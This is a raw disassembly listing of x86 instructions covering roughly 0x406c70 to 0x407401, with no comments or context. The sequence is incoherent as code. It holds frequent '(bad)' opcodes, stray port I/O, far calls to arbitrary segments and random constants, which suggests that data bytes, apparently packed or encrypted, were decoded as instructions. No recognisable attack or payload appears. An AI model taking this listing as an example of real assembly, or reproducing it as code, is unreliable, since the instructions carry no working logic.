  406c70:	aaa    
  406c71:	xlat   BYTE PTR ds:[ebx]
  406c72:	mov    esp,0xd26c6db0
  406c77:	lods   al,BYTE PTR ds:[esi]
  406c78:	push   ebx
  406c79:	dec    ebx
  406c7a:	cmp    BYTE PTR [edx+0x55],al
  406c7d:	add    al,BYTE PTR [ebx+0x65f432b5]
  406c83:	stos   DWORD PTR es:[edi],eax
  406c84:	adc    bl,bh
  406c86:	inc    esi
  406c87:	stos   DWORD PTR es:[edi],eax
  406c88:	lods   al,BYTE PTR ds:[esi]
  406c89:	arpl   WORD PTR [ebp+eiz*8+0x48],bx
  406c8d:	jae    0x406c12
  406c8f:	xor    edx,ebx
  406c91:	mov    eax,0x9679a589
  406c96:	cmp    dl,ah
  406c98:	pusha  
  406c99:	stos   DWORD PTR es:[edi],eax
  406c9a:	(bad)  
  406c9b:	loopne 0x406cb5
  406c9d:	xor    edi,DWORD PTR [edi]
  406c9f:	xor    esp,DWORD PTR [ecx]
  406ca1:	jae    0x406cb8
  406ca3:	shl    al,cl
  406ca5:	loopne 0x406cc2
  406ca7:	ja     0x406d16
  406ca9:	es dec edi
  406cab:	sub    esi,esi
  406cad:	sub    ebx,esi
  406caf:	dec    ecx
  406cb0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406cb1:	sar    bh,1
  406cb3:	cmp    DWORD PTR [edx+0x256e9c0f],0xffffffa3
  406cba:	dec    esp
  406cbb:	and    al,0x9a
  406cbd:	sub    al,0x51
  406cbf:	mov    eax,ds:0xfc0b3dd7
  406cc4:	repz mov ch,BYTE PTR [ecx]
  406cc7:	and    eax,0xb73dc52a
  406ccc:	push   cs
  406ccd:	add    esp,DWORD PTR [edx+0x4e610301]
  406cd3:	inc    DWORD PTR [edi+0x102d0d2e]
  406cd9:	std    
  406cda:	jno    0x406d49
  406cdc:	sub    ah,BYTE PTR [eax+0x6cae3694]
  406ce2:	pop    eax
  406ce3:	ja     0x406d5f
  406ce5:	shl    DWORD PTR [ecx],1
  406ce7:	sahf   
  406ce8:	shl    bl,1
  406cea:	repnz and cl,dl
  406ced:	adc    al,0x25
  406cef:	ins    BYTE PTR es:[edi],dx
  406cf0:	push   esp
  406cf1:	xchg   edi,eax
  406cf2:	mov    ebp,0x33418aed
  406cf7:	inc    esi
  406cf8:	cs pusha 
  406cfa:	pop    ds
  406cfb:	jbe    0x406d43
  406cfd:	jge    0x406d62
  406cff:	xor    eax,DWORD PTR [esi+0x5dab1007]
  406d05:	stos   DWORD PTR es:[edi],eax
  406d06:	inc    ebx
  406d07:	ins    BYTE PTR es:[edi],dx
  406d08:	pop    esp
  406d09:	fwait
  406d0a:	test   eax,0x5aa5a462
  406d0f:	das    
  406d10:	xchg   ebx,eax
  406d11:	and    eax,0xc05030ac
  406d16:	cmp    BYTE PTR [ebx-0x58],al
  406d19:	sub    edx,esp
  406d1b:	inc    edx
  406d1c:	inc    ecx
  406d1d:	jle    0x406d32
  406d1f:	int3   
  406d20:	into   
  406d21:	add    eax,0x675c9896
  406d26:	adc    eax,0x67aa4e39
  406d2b:	add    al,0xb8
  406d2d:	jge    0x406d16
  406d2f:	cwde   
  406d30:	xchg   DWORD PTR [ebx+esi*8],eax
  406d33:	mov    ds:0x2f20815b,al
  406d38:	adc    al,0x54
  406d3a:	dec    eax
  406d3b:	(bad)  
  406d3c:	mov    ch,0xc2
  406d3e:	inc    edx
  406d3f:	(bad)  
  406d40:	push   edi
  406d41:	dec    edi
  406d42:	push   0xf5f01848
  406d47:	scas   al,BYTE PTR es:[edi]
  406d48:	dec    ebp
  406d49:	pop    edx
  406d4a:	adc    dl,BYTE PTR [ecx+0x5e]
  406d4d:	and    bl,BYTE PTR [esi+edx*1+0x5f]
  406d51:	je     0x406d5a
  406d53:	inc    esp
  406d54:	adc    DWORD PTR [ebx],0xdaed67ad
  406d5a:	inc    esp
  406d5b:	jbe    0x406dab
  406d5d:	outs   dx,DWORD PTR ds:[esi]
  406d5e:	das    
  406d5f:	adc    edi,edx
  406d61:	bound  esp,QWORD PTR [eax+edx*1]
  406d64:	fiadd  WORD PTR [edx+edi*8]
  406d67:	sbb    ch,BYTE PTR ds:0x306b171e
  406d6d:	sbb    DWORD PTR [ebp-0x60ca2a7d],esi
  406d73:	loopne 0x406dbf
  406d75:	add    ah,ch
  406d77:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406d78:	dec    edx
  406d79:	in     al,dx
  406d7a:	stos   DWORD PTR es:[edi],eax
  406d7b:	xor    eax,0x7a3f1bd
  406d80:	pop    esp
  406d81:	data16 gs out dx,al
  406d84:	add    eax,0x7371599f
  406d89:	popf   
  406d8a:	repz test BYTE PTR ds:0x8158084c,bl
  406d91:	stos   BYTE PTR es:[edi],al
  406d92:	retf   0xcafd
  406d95:	call   0xfa7f:0x4ca6725c
  406d9c:	sub    bl,BYTE PTR [ebx+0x2fbfed86]
  406da2:	xor    eax,0x9066af9c
  406da7:	daa    
  406da8:	inc    esp
  406da9:	and    DWORD PTR [ecx],0xffffffd8
  406dac:	loope  0x406d8a
  406dae:	iret   
  406daf:	(bad)  
  406db0:	jnp    0x406dc1
  406db2:	cwde   
  406db3:	pushf  
  406db4:	fidivr DWORD PTR [ebx]
  406db6:	(bad)  
  406db7:	out    dx,al
  406db8:	popa   
  406db9:	fs dec ebx
  406dbb:	jmp    DWORD PTR [eax]
  406dbd:	mov    dl,0xc2
  406dbf:	push   edi
  406dc0:	fdivr  QWORD PTR [eax+0x3f051d93]
  406dc6:	jb     0x406d4c
  406dc8:	inc    eax
  406dc9:	xor    BYTE PTR [eax+0x1e9338f],0x6c
  406dd0:	push   ecx
  406dd1:	int3   
  406dd2:	add    esi,edi
  406dd4:	cmp    DWORD PTR [edx],ebp
  406dd6:	xor    al,0xa1
  406dd8:	dec    esi
  406dd9:	or     DWORD PTR [edi+0x495c63a6],esi
  406ddf:	lods   al,BYTE PTR ds:[esi]
  406de0:	dec    ebx
  406de1:	sub    edx,edx
  406de3:	sbb    cl,BYTE PTR [ebx]
  406de5:	adc    ch,BYTE PTR [ebx-0x6]
  406de8:	dec    ebp
  406de9:	loopne 0x406d9c
  406deb:	loop   0x406e49
  406ded:	pop    ebx
  406dee:	scas   al,BYTE PTR es:[edi]
  406def:	repz mov eax,ds:0x4b6d284c
  406df5:	pushf  
  406df6:	push   ebx
  406df7:	bnd jle 0x406df7
  406dfa:	adc    esi,DWORD PTR [eax]
  406dfc:	pop    eax
  406dfd:	mov    ?,esi
  406dff:	sub    edx,DWORD PTR [esi+0x45938640]
  406e05:	pop    ecx
  406e06:	icebp  
  406e07:	in     eax,0xd5
  406e09:	sti    
  406e0a:	dec    ecx
  406e0b:	push   edx
  406e0c:	pop    ecx
  406e0d:	jmp    ebx
  406e0f:	add    edi,DWORD PTR [edx-0x16]
  406e12:	or     cl,dl
  406e14:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406e15:	add    al,0x13
  406e17:	scas   al,BYTE PTR es:[edi]
  406e18:	fldcw  WORD PTR [ecx+esi*1+0x26]
  406e1c:	sbb    al,0xb1
  406e1e:	mov    ch,0x5f
  406e20:	in     eax,dx
  406e21:	scas   eax,DWORD PTR es:[edi]
  406e22:	das    
  406e23:	lds    ebp,FWORD PTR [edi]
  406e25:	pop    ebp
  406e26:	dec    ebp
  406e27:	call   0x58b7:0xa567a074
  406e2e:	loop   0x406db9
  406e30:	test   BYTE PTR [esi],0x83
  406e33:	pop    esp
  406e34:	inc    eax
  406e35:	cmp    al,0x2
  406e37:	push   ss
  406e38:	in     al,0xdd
  406e3a:	add    al,0xcc
  406e3c:	pop    esi
  406e3d:	mov    ds:0x4a0148c1,al
  406e42:	mov    ds:0x237f0b22,al
  406e47:	out    dx,eax
  406e48:	ss mov dh,0x6c
  406e4b:	cs loope 0x406eca
  406e4e:	xchg   edx,eax
  406e4f:	mov    WORD PTR [edx+eiz*2],fs
  406e52:	xor    bh,cl
  406e54:	xlat   BYTE PTR ds:[ebx]
  406e55:	mov    ds:0x1c46964d,eax
  406e5a:	sub    bh,dh
  406e5c:	mov    esi,0xfb3adc88
  406e61:	fld    DWORD PTR [esp+ecx*4-0x46]
  406e65:	mov    cl,0xd2
  406e67:	bnd jg 0x406dfe
  406e6a:	inc    ebp
  406e6b:	es jmp 0x6f19daa7
  406e71:	(bad)  
  406e73:	xor    eax,0x25032fb5
  406e78:	dec    edi
  406e79:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406e7a:	femms  
  406e7c:	push   0xfffffffd
  406e7e:	(bad)  
  406e7f:	out    0xbc,eax
  406e81:	outs   dx,DWORD PTR ds:[esi]
  406e82:	fbld   TBYTE PTR [ebx]
  406e84:	(bad)  
  406e85:	jg     0x406ea3
  406e87:	sbb    dh,BYTE PTR [ecx+edx*2+0x45756954]
  406e8e:	pusha  
  406e8f:	sahf   
  406e90:	inc    ebp
  406e91:	sub    esp,edx
  406e93:	xor    al,0x8a
  406e95:	pop    edx
  406e96:	lods   eax,DWORD PTR ds:[esi]
  406e97:	dec    ebx
  406e98:	lods   al,BYTE PTR ds:[esi]
  406e99:	inc    edx
  406e9a:	into   
  406e9b:	jg     0x406ec6
  406e9d:	rcr    BYTE PTR [ebx],0x19
  406ea0:	jmp    0x89a9:0x9c8d32e1
  406ea7:	xchg   edi,eax
  406ea8:	mov    al,ds:0x9a2efff8
  406ead:	test   eax,0xbd99f0e5
  406eb2:	sbb    esi,DWORD PTR [ecx]
  406eb4:	add    BYTE PTR [ebp+0x1e],bh
  406eb7:	sub    cl,BYTE PTR [ebx-0x2f]
  406eba:	push   0x71158e4a
  406ebf:	or     DWORD PTR [ecx+0x6dbfc533],edx
  406ec5:	out    0x8,eax
  406ec7:	stc    
  406ec8:	mov    DWORD PTR [edi],edi
  406eca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406ecb:	pop    esi
  406ecc:	fdivr  DWORD PTR [ebp-0x71]
  406ecf:	mov    cs,WORD PTR [eax+0x3e]
  406ed2:	scas   al,BYTE PTR es:[edi]
  406ed3:	xlat   BYTE PTR ds:[ebx]
  406ed4:	mov    al,ah
  406ed6:	ret    0x41b
  406ed9:	push   cs
  406eda:	cwde   
  406edb:	test   BYTE PTR [edx],al
  406edd:	dec    ecx
  406ede:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406edf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406ee0:	and    ch,dh
  406ee2:	adc    dl,BYTE PTR [ebp-0x6bee7536]
  406ee8:	xor    esi,ebx
  406eea:	cmp    DWORD PTR [eax],0xffffffe3
  406eed:	retf   0xd9e4
  406ef0:	mov    ebx,0xb2ee21f0
  406ef5:	jne    0x406e81
  406ef7:	mov    al,0x8c
  406ef9:	enter  0x7861,0xfb
  406efd:	mov    ds:0x87f629ac,al
  406f02:	mov    BYTE PTR [esi],cl
  406f04:	xchg   edi,eax
  406f05:	and    eax,0xf4f3401f
  406f0a:	mov    esp,0x5ddff4a5
  406f0f:	icebp  
  406f10:	repnz lods al,BYTE PTR ds:[esi]
  406f12:	test   DWORD PTR [ecx],edx
  406f14:	ja     0x406f18
  406f16:	data16 outs dx,BYTE PTR ds:[esi]
  406f18:	sub    DWORD PTR [eax],esi
  406f1a:	or     al,0x47
  406f1c:	out    0x39,eax
  406f1e:	dec    ebp
  406f1f:	shl    BYTE PTR [ebx+ebx*2],0x21
  406f23:	std    
  406f24:	sbb    DWORD PTR [edi+0x43afd484],0xffffffc7
  406f2b:	fldlg2 
  406f2d:	sbb    cl,BYTE PTR [ecx]
  406f2f:	repnz leave 
  406f31:	push   ss
  406f32:	push   0xfffffff4
  406f34:	xchg   ebp,eax
  406f35:	out    dx,al
  406f36:	jmp    0x406f0e
  406f38:	out    dx,al
  406f39:	inc    ecx
  406f3a:	or     dh,bh
  406f3c:	inc    edx
  406f3d:	pop    esi
  406f3e:	xor    DWORD PTR [esi],0x9b053bfc
  406f44:	(bad)  
  406f45:	cld    
  406f46:	mov    BYTE PTR [eax],bl
  406f48:	mov    esi,0xc04820d5
  406f4d:	xchg   ebx,eax
  406f4e:	xchg   edi,eax
  406f4f:	fs push es
  406f51:	sub    cl,ah
  406f53:	inc    ebp
  406f54:	push   eax
  406f55:	and    eax,0x123416fc
  406f5a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406f5b:	adc    dh,BYTE PTR [edi]
  406f5d:	mov    ds:0x30537f00,eax
  406f62:	or     DWORD PTR [eax-0x38d63b14],ebp
  406f68:	mov    DWORD PTR [ebx+0x56dc47e8],0x6201eed9
  406f72:	mov    ecx,0xe15110e9
  406f77:	push   esp
  406f78:	push   ecx
  406f79:	sub    bl,BYTE PTR [esp+eiz*2+0x41]
  406f7d:	jns    0x406f3b
  406f7f:	xchg   ebp,eax
  406f80:	sub    BYTE PTR [ebp-0x2793fcc],0x2d
  406f87:	xchg   ebx,eax
  406f88:	cld    
  406f89:	mov    edi,DWORD PTR [edx-0x36]
  406f8c:	adc    dl,BYTE PTR [ecx-0x2c]
  406f8f:	ret    0x323f
  406f92:	ins    DWORD PTR es:[edi],dx
  406f93:	mov    al,0xa7
  406f95:	shl    DWORD PTR [esi-0x4a],0xe3
  406f99:	lock fistp DWORD PTR [eax+0x41]
  406f9d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406f9e:	fimul  WORD PTR [eax]
  406fa0:	loopne 0x406fce
  406fa2:	cmc    
  406fa3:	mov    edx,0x9c9dbdb4
  406fa8:	sbb    BYTE PTR [ebx-0x7d],al
  406fab:	pop    es
  406fac:	jo     0x406f86
  406fae:	clc    
  406faf:	outs   dx,BYTE PTR ds:[esi]
  406fb0:	aaa    
  406fb1:	jb     0x406f9a
  406fb3:	sahf   
  406fb4:	cwde   
  406fb5:	sub    al,0x27
  406fb7:	sub    eax,0xb434174c
  406fbc:	sbb    eax,0xe94ebe94
  406fc1:	cmc    
  406fc2:	mov    ch,0xb0
  406fc4:	adc    bh,BYTE PTR [edi+0x66f0b1cc]
  406fca:	sar    DWORD PTR [ecx],0x36
  406fcd:	je     0x406fe7
  406fcf:	adc    eax,0x38c734cd
  406fd4:	jbe    0x407039
  406fd6:	std    
  406fd7:	sbb    ah,BYTE PTR [ebx]
  406fd9:	fcomp  st(4)
  406fdb:	cmp    ecx,DWORD PTR [esi+0x71ad971a]
  406fe1:	or     ebx,DWORD PTR [eax]
  406fe3:	fdivr  st,st(7)
  406fe5:	scas   eax,DWORD PTR es:[edi]
  406fe6:	xor    BYTE PTR [edx],bh
  406fe8:	cmp    esp,DWORD PTR [ecx+edx*2+0x13928610]
  406fef:	popf   
  406ff0:	in     al,dx
  406ff1:	dec    edi
  406ff2:	cmp    BYTE PTR [edx+0x9e33220],al
  406ff8:	add    ah,bh
  406ffa:	and    al,0xd7
  406ffc:	push   cs
  406ffd:	ret    0x5e8e
  407000:	xchg   BYTE PTR [ecx+edx*4-0x1a785e7f],ch
  407007:	idiv   BYTE PTR [ebp+0x71]
  40700a:	cmp    BYTE PTR [eax+0x56],0x46
  40700e:	loope  0x40702a
  407010:	jmp    0x80fe8d6b
  407015:	out    dx,eax
  407016:	xor    ch,BYTE PTR [eax]
  407018:	mov    esp,0x623a765d
  40701d:	faddp  st(3),st
  40701f:	xor    DWORD PTR [esi+0x22],eax
  407022:	sub    al,0x1c
  407024:	xchg   ecx,eax
  407025:	pop    edi
  407026:	test   DWORD PTR [esi],0x71874114
  40702c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40702d:	push   es
  40702e:	pop    eax
  40702f:	mov    al,ds:0x9dd6153d
  407034:	pop    ecx
  407035:	dec    eax
  407036:	jg     0x407080
  407038:	rcr    BYTE PTR [ecx+0x388b2a48],cl
  40703e:	xor    bh,BYTE PTR [ecx]
  407040:	pop    edi
  407041:	xor    eax,0x9e346e2
  407046:	mov    ds:0x5ba238f1,al
  40704b:	jae    0x406fd7
  40704d:	lods   eax,DWORD PTR ds:[esi]
  40704e:	pop    edi
  40704f:	mov    eax,0x10e9755
  407054:	int3   
  407055:	mov    ecx,0x2a51e197
  40705a:	repnz stos DWORD PTR es:[edi],eax
  40705c:	xor    edx,esp
  40705e:	adc    DWORD PTR ds:0x8183f473,ebp
  407064:	in     eax,dx
  407065:	adc    bh,BYTE PTR [eax]
  407067:	mov    edx,0x6eda03c
  40706c:	xlat   BYTE PTR ds:[ebx]
  40706d:	in     eax,0x1e
  40706f:	xor    BYTE PTR [ebx-0x601cb4c8],dh
  407075:	adc    BYTE PTR [ecx+0x7d57796f],0x7f
  40707c:	cmp    BYTE PTR [ecx-0x68ca1a01],0xdc
  407083:	push   cs
  407084:	outs   dx,DWORD PTR ds:[esi]
  407085:	jg     0x4070fe
  407087:	jne    0x4070b1
  407089:	pop    es
  40708a:	or     bl,BYTE PTR [edi]
  40708c:	loope  0x407092
  40708e:	aad    0xbb
  407090:	mov    dl,0x6f
  407092:	xchg   ebx,eax
  407093:	xor    BYTE PTR [edi-0x1a2c4efa],ch
  407099:	arpl   WORD PTR [ecx-0x69e2a052],bx
  40709f:	add    eax,0x678a48f6
  4070a4:	js     0x407045
  4070a6:	je     0x4070e5
  4070a8:	add    bl,BYTE PTR [esi]
  4070aa:	sar    BYTE PTR [esi-0x1d149618],0xe0
  4070b1:	sub    ecx,DWORD PTR [edx+edi*1-0x77]
  4070b5:	or     al,0x2d
  4070b7:	out    0x2d,al
  4070b9:	loope  0x40712f
  4070bb:	stc    
  4070bc:	or     al,0xb6
  4070be:	xchg   esi,eax
  4070bf:	out    dx,al
  4070c0:	fisttp QWORD PTR [esp+0x59d09c07]
  4070c7:	xchg   edx,ebx
  4070c9:	xor    al,0x18
  4070cb:	jbe    0x407137
  4070cd:	inc    edi
  4070ce:	push   edx
  4070cf:	enter  0x1b3e,0xd3
  4070d3:	fld    DWORD PTR [edx-0x3334afd]
  4070d9:	repz jno 0x4070c1
  4070dc:	xor    al,0x6c
  4070de:	loop   0x40709b
  4070e0:	cmp    BYTE PTR [esi+0x17],cl
  4070e3:	dec    edx
  4070e4:	push   0x560ee448
  4070e9:	sti    
  4070ea:	fist   WORD PTR fs:[esi]
  4070ed:	and    dl,BYTE PTR [esi]
  4070ef:	pop    ds
  4070f0:	das    
  4070f1:	clc    
  4070f2:	pop    edi
  4070f3:	cmp    eax,edx
  4070f5:	cmp    BYTE PTR [edx+0x4a857b5e],bl
  4070fb:	xchg   edx,eax
  4070fc:	xchg   BYTE PTR [edi+0x2c5a31d2],cl
  407102:	scas   al,BYTE PTR es:[edi]
  407103:	sti    
  407104:	push   es
  407105:	aam    0xa9
  407107:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407108:	in     eax,0xdf
  40710a:	pop    ss
  40710b:	dec    edi
  40710c:	mov    WORD PTR cs:[ebx+0x78830b51],fs
  407113:	sub    BYTE PTR [ebp+0x16fc225e],bl
  407119:	stos   DWORD PTR es:[edi],eax
  40711a:	xchg   edi,eax
  40711b:	outs   dx,DWORD PTR ds:[esi]
  40711c:	sbb    ch,BYTE PTR [edx+0x6e]
  40711f:	cmp    DWORD PTR [edx-0x1b],esi
  407122:	mov    ecx,0xbb71d9d9
  407127:	and    DWORD PTR [edx+0x5c],eax
  40712a:	mov    edx,0xc3e83d83
  40712f:	xchg   edx,eax
  407130:	cmp    eax,0xeb0b630e
  407135:	sub    al,0x29
  407137:	mov    bl,0x18
  407139:	mov    ch,0x64
  40713b:	inc    eax
  40713c:	shl    BYTE PTR [ebp+eax*4+0x4b237007],1
  407143:	iret   
  407144:	lahf   
  407145:	pop    ds
  407146:	xor    eax,0xab5d55c3
  40714b:	shr    BYTE PTR [esi+edi*1-0xfb73192],0x6f
  407153:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407154:	cwde   
  407155:	mov    bh,0xc9
  407157:	sbb    eax,0x30068066
  40715c:	ins    DWORD PTR es:[edi],dx
  40715d:	jb     0x4071cd
  40715f:	mov    ds,WORD PTR [ebp+0x75]
  407162:	out    dx,eax
  407163:	mov    ebx,0xb5044d2d
  407168:	mov    ebx,0x9d2c0f52
  40716d:	cdq    
  40716e:	inc    ebx
  40716f:	inc    edi
  407170:	push   ss
  407171:	mov    al,0x2f
  407173:	sbb    BYTE PTR [edx-0x40],cl
  407176:	mov    edx,0x2d7af0b1
  40717b:	int    0x18
  40717d:	add    DWORD PTR ss:[esi+0x3a],eax
  407181:	sbb    cl,BYTE PTR [ebx+edi*8+0x661c2b2f]
  407188:	mov    cl,0x72
  40718a:	or     esp,DWORD PTR [edx-0x78ff6465]
  407190:	xchg   esi,eax
  407191:	jae    0x407197
  407193:	sbb    DWORD PTR [eax+0xc],0x2b
  407197:	repnz cli 
  407199:	call   FWORD PTR [ebx+0x2b]
  40719c:	cld    
  40719d:	cld    
  40719e:	pop    es
  40719f:	cli    
  4071a0:	bound  ebp,QWORD PTR [ebx+ebp*1+0x5b]
  4071a4:	jb     0x4071cf
  4071a6:	push   ss
  4071a7:	sub    esi,DWORD PTR [edx-0x35]
  4071aa:	bound  ebx,QWORD PTR [esi+0x6c]
  4071ad:	fmul   DWORD PTR ds:0x60c68444
  4071b3:	pop    es
  4071b4:	xor    eax,0x4eb4f06e
  4071b9:	test   eax,0x2c467684
  4071be:	jge    0x4071f6
  4071c0:	sti    
  4071c1:	lods   al,BYTE PTR ds:[esi]
  4071c2:	cli    
  4071c3:	xor    al,0x3e
  4071c5:	inc    edi
  4071c6:	in     eax,dx
  4071c7:	in     al,0xf8
  4071c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4071ca:	mov    ds:0x4ab500ac,al
  4071cf:	enter  0xc8e5,0x5
  4071d3:	retf   0x75bf
  4071d6:	mov    al,0xa
  4071d8:	aam    0x99
  4071da:	inc    edx
  4071db:	js     0x4071b3
  4071dd:	or     edx,DWORD PTR [esi]
  4071df:	pop    ebx
  4071e0:	mov    al,0x2d
  4071e2:	mov    cl,0x11
  4071e4:	xor    DWORD PTR [esi+0x44af2973],ebp
  4071ea:	inc    edx
  4071eb:	and    BYTE PTR [eax-0x7874f94f],dh
  4071f1:	aad    0x79
  4071f3:	fld    QWORD PTR ds:0xc8daade1
  4071f9:	jg     0x4071b1
  4071fb:	fs fwait
  4071fd:	sar    BYTE PTR [ebx],1
  4071ff:	int3   
  407200:	sbb    BYTE PTR [ebp-0x17f8d709],ah
  407206:	adc    BYTE PTR [edx],al
  407208:	rol    DWORD PTR [eax],1
  40720a:	jae    0x4071c7
  40720c:	ret    
  40720d:	fstp   st(0)
  40720f:	aam    0x48
  407211:	ja     0x40721d
  407213:	lock mov eax,DWORD PTR [ebp-0x72]
  407217:	idiv   DWORD PTR [edx+0x41]
  40721a:	icebp  
  40721b:	(bad)  
  40721c:	adc    ax,WORD PTR [ebx]
  40721f:	pop    edx
  407220:	(bad)  
  407221:	pop    eax
  407222:	jne    0x40720e
  407224:	call   0xcad9:0x203d77d4
  40722b:	mov    edi,DWORD PTR [edi+eiz*2+0x1f9f74a6]
  407232:	add    ebp,DWORD PTR [esi-0x4b886bf2]
  407238:	sbb    esp,0xffffffc0
  40723b:	cmp    al,cl
  40723d:	hlt    
  40723e:	adc    eax,eax
  407240:	cdq    
  407241:	mov    es,WORD PTR [edi+ecx*8-0x57]
  407245:	inc    ebx
  407246:	clc    
  407247:	scas   al,BYTE PTR es:[edi]
  407248:	or     eax,ebx
  40724a:	push   ebp
  40724b:	inc    ebx
  40724c:	and    ah,BYTE PTR [edi+0x12]
  40724f:	scas   eax,DWORD PTR es:[edi]
  407250:	xchg   DWORD PTR [ecx+0x13],eax
  407253:	and    BYTE PTR ds:0x438d76b1,ah
  407259:	sbb    DWORD PTR [edx],ebp
  40725b:	inc    edx
  40725c:	cs xchg ebx,eax
  40725e:	test   eax,0x5d9706ce
  407263:	adc    al,0xa8
  407265:	and    bh,BYTE PTR [ebx-0x35]
  407268:	sbb    bh,BYTE PTR [eax+0x12fb868c]
  40726e:	sbb    al,0x67
  407270:	dec    ebx
  407271:	into   
  407272:	dec    eax
  407273:	inc    esp
  407274:	jg     0x40728c
  407276:	sub    DWORD PTR [edx+0x6e],edx
  407279:	adc    dh,BYTE PTR [ecx]
  40727b:	scas   al,BYTE PTR es:[edi]
  40727c:	jmp    0x407207
  40727e:	mov    DWORD PTR [eax-0x1f],ebp
  407281:	xor    DWORD PTR [ecx+0x7fd27f62],ebx
  407287:	adc    cl,cl
  407289:	gs inc ecx
  40728b:	inc    esp
  40728c:	xor    BYTE PTR [eax+0x34baabff],bh
  407292:	mov    dl,0x17
  407294:	mov    edi,0x768b1b92
  407299:	ret    
  40729a:	mov    ds:0x92a3d1c5,eax
  40729f:	sbb    al,0xd8
  4072a1:	adc    al,0x15
  4072a3:	pusha  
  4072a4:	mov    ebp,0x3bbd4086
  4072a9:	repz ja 0x40724f
  4072ac:	dec    edx
  4072ad:	sbb    eax,0x74d4f285
  4072b2:	jo     0x407249
  4072b4:	(bad)  
  4072b5:	mov    cl,0x89
  4072b7:	cmp    DWORD PTR ds:0xe1e67f0d,ecx
  4072bd:	add    al,0x3b
  4072bf:	sub    cl,bh
  4072c1:	aam    0xb3
  4072c3:	xor    bl,BYTE PTR [edi+0x1ce7feb2]
  4072c9:	outs   dx,BYTE PTR ds:[esi]
  4072ca:	sbb    eax,0x38d88d51
  4072cf:	sti    
  4072d0:	xor    esi,ecx
  4072d2:	jb     0x4072e8
  4072d4:	xchg   ebx,eax
  4072d5:	inc    edi
  4072d6:	jb     0x407310
  4072d8:	scas   eax,DWORD PTR es:[edi]
  4072d9:	adc    BYTE PTR [ecx-0x82ce5f],ah
  4072df:	pop    edi
  4072e0:	lock jg 0x4072fa
  4072e3:	out    0x3e,al
  4072e5:	mov    dh,0x9e
  4072e7:	mov    eax,ds:0x1ba749e6
  4072ec:	jmp    0xb9a73866
  4072f1:	add    BYTE PTR [edi+ebp*2],0x29
  4072f5:	sbb    dl,dh
  4072f7:	(bad)  
  4072f8:	call   0x41f8:0x1c31ab6a
  4072ff:	mov    al,0xc3
  407301:	sti    
  407302:	cmp    eax,0x54feaac4
  407307:	or     esp,edi
  407309:	pop    es
  40730a:	inc    eax
  40730b:	or     DWORD PTR [edi],esp
  40730d:	gs jns 0x4072b5
  407310:	stos   BYTE PTR es:[edi],al
  407311:	repz sbb ebx,DWORD PTR [ebp+0x5d]
  407315:	fst    DWORD PTR [ecx+0x4e05c51]
  40731b:	cs loop 0x4072fc
  40731e:	add    esp,ebp
  407320:	mov    ecx,0x435fb0bc
  407325:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407326:	mov    dl,0xf
  407328:	push   es
  407329:	mov    dl,0x6c
  40732b:	dec    ebp
  40732c:	jecxz  0x407312
  40732e:	les    edx,FWORD PTR [edx+0x110dcbe]
  407334:	jb     0x407317
  407336:	pop    eax
  407337:	stos   BYTE PTR es:[edi],al
  407338:	inc    ebp
  407339:	retf   0xcccb
  40733c:	mov    ah,0xd5
  40733e:	sub    dh,ch
  407340:	cs cmc 
  407342:	test   al,0x8e
  407344:	jns    0x407336
  407346:	cs cmp al,0xc5
  407349:	data16 test BYTE PTR [edx-0x7c],0x7
  40734e:	int3   
  40734f:	shl    BYTE PTR [edx+0x35],cl
  407352:	enter  0xeb30,0xaf
  407356:	jmp    0xd2f421f4
  40735b:	data16 jo 0x407320
  40735e:	loope  0x407364
  407360:	(bad)  
  407362:	adc    bl,BYTE PTR [edx+0x72a6eb5e]
  407368:	outs   dx,DWORD PTR ds:[esi]
  407369:	push   edi
  40736a:	xchg   BYTE PTR [edx-0x13],dh
  40736d:	jae    0x40730e
  40736f:	or     DWORD PTR [edi+0x52],0x91017852
  407376:	push   ecx
  407377:	out    0xb1,al
  407379:	mov    DWORD PTR [ebp+ecx*1-0x4d],esp
  40737d:	enter  0xb0fd,0xf2
  407381:	or     esp,DWORD PTR [ebx]
  407383:	retf   0x9f71
  407386:	inc    esp
  407387:	leave  
  407388:	add    ch,cl
  40738a:	cmp    dl,BYTE PTR [ecx]
  40738c:	jecxz  0x4073bf
  40738e:	xor    BYTE PTR [ebx-0x3a88f278],0x3e
  407395:	test   DWORD PTR [edx-0x3ad28d56],0x9b45efda
  40739f:	dec    edx
  4073a0:	loope  0x4073ca
  4073a2:	jnp    0x407325
  4073a4:	xor    ebx,DWORD PTR [ebx-0x49]
  4073a7:	xor    ebp,ecx
  4073a9:	lock retf 
  4073ab:	sbb    ah,dh
  4073ad:	mov    dh,0xf
  4073af:	or     esp,edx
  4073b1:	cmp    BYTE PTR [ecx+eiz*4+0x7],al
  4073b5:	add    al,0xfd
  4073b7:	hlt    
  4073b8:	jge    0x4073f3
  4073ba:	jb     0x407376
  4073bc:	xchg   ebx,eax
  4073bd:	call   0x875:0xfdcf47b5
  4073c4:	outs   dx,DWORD PTR ds:[esi]
  4073c5:	pushf  
  4073c6:	fiadd  DWORD PTR [ebx]
  4073c8:	add    ecx,DWORD PTR [edx+0x3cac6315]
  4073ce:	cmp    al,0x16
  4073d0:	inc    edi
  4073d1:	jns    0x40740b
  4073d3:	fcom   DWORD PTR [ecx+edx*8-0x66]
  4073d7:	fs mov esi,0x7794e712
  4073dd:	popf   
  4073de:	pop    ecx
  4073df:	dec    esi
  4073e0:	(bad)  
  4073e2:	or     eax,0x4208fcd5
  4073e7:	dec    al
  4073e9:	xchg   ebx,eax
  4073ea:	mov    ds:0xab580ecf,al
  4073ef:	pop    eax
  4073f0:	push   esi
  4073f2:	mov    ecx,0x8d3d91e1
  4073f7:	push   edx
  4073f8:	fst    QWORD PTR ds:0xe4dd442a
  4073fe:	cld    
  4073ff:	pop    ds
  407400:	das    
  407401:	pushf  
